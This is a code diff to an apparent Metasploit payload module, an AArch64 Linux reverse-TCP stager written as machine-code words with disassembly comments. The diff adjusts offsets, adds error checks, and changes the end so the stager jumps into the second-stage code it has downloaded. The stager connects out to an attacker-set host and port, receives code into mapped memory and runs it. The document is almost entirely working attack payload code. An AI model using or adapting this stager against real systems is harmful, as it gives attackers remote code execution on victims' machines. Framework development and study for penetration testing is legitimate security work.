@@ -17,7 +17,7 @@ require 'msf/core/handler/reverse_tcp'
 ###
 module MetasploitModule
 
-  CachedSize = 260
+  CachedSize = 212
 
   include Msf::Payload::Stager
 
@@ -33,8 +33,8 @@ module MetasploitModule
         {
           'Offsets' =>
             {
-              'LPORT' => [ 186, 'n'    ],
-              'LHOST' => [ 188, 'ADDR' ],
+              'LPORT' => [ 206, 'n'    ],
+              'LHOST' => [ 208, 'ADDR' ],
             },
           'Payload' =>
           [
@@ -45,19 +45,20 @@ module MetasploitModule
             0xd28018c8,          #  mov	x8, #0xc6                  	// #198
             0xd4000001,          #  svc	#0x0
             0xaa0003ec,          #  mov	x12, x0
-            0x10000501,          #  adr	x1, b8 <sockaddr>
+            0x100005a1,          #  adr	x1, cc <sockaddr>
             0xd2800202,          #  mov	x2, #0x10                  	// #16
             0xd2801968,          #  mov	x8, #0xcb                  	// #203
             0xd4000001,          #  svc	#0x0
-            0x35000420,          #  cbnz	w0, ac <failed>
+            0x350004c0,          #  cbnz	w0, c0 <failed>
             0xaa0c03e0,          #  mov	x0, x12
             0xd10043ff,          #  sub	sp, sp, #0x10
             0x910003e1,          #  mov	x1, sp
             0xd2800082,          #  mov	x2, #0x4                   	// #4
             0xd28007e8,          #  mov	x8, #0x3f                  	// #63
             0xd4000001,          #  svc	#0x0
-            0x34000340,          #  cbz	w0, ac <failed>
-            0xf94003e2,          #  ldr	x2, [sp]
+            0xb100041f,          #  cmn	x0, #0x1
+            0x540003c0,          #  b.eq	c0 <failed>
+            0xb94003e2,          #  ldr	w2, [sp]
             0xd34cfc42,          #  lsr	x2, x2, #12
             0x91000442,          #  add	x2, x2, #0x1
             0xd374cc42,          #  lsl	x2, x2, #12
@@ -69,7 +70,9 @@ module MetasploitModule
             0xaa1f03e5,          #  mov	x5, xzr
             0xd2801bc8,          #  mov	x8, #0xde                  	// #222
             0xd4000001,          #  svc	#0x0
-            0xf94003e4,          #  ldr	x4, [sp]
+            0xb100041f,          #  cmn	x0, #0x1
+            0x54000200,          #  b.eq	c0 <failed>
+            0xb94003e4,          #  ldr	w4, [sp]
             0xf90003e0,          #  str	x0, [sp]
             0xaa0003e3,          #  mov	x3, x0
             0xaa0c03e0,          #  mov	x0, x12
@@ -77,11 +80,13 @@ module MetasploitModule
             0xaa0403e2,          #  mov	x2, x4
             0xd28007e8,          #  mov	x8, #0x3f                  	// #63
             0xd4000001,          #  svc	#0x0
+            0xb100041f,          #  cmn	x0, #0x1
+            0x540000c0,          #  b.eq	c0 <failed>
             0x8b000063,          #  add	x3, x3, x0
             0xeb000084,          #  subs	x4, x4, x0
-            0x54ffff21,          #  b.ne	84 <read_loop>
-            0xf94003fe,          #  ldr	x30, [sp]
-            0xd65f03c0,          #  ret
+            0x54fffee1,          #  b.ne	90 <read_loop>
+            0xf94003e0,          #  ldr	x0, [sp]
+            0xd63f0000,          #  blr	x0
             0xd2800000,          #  mov	x0, #0x0                   	// #0
             0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
             0xd4000001,          #  svc	#0x0
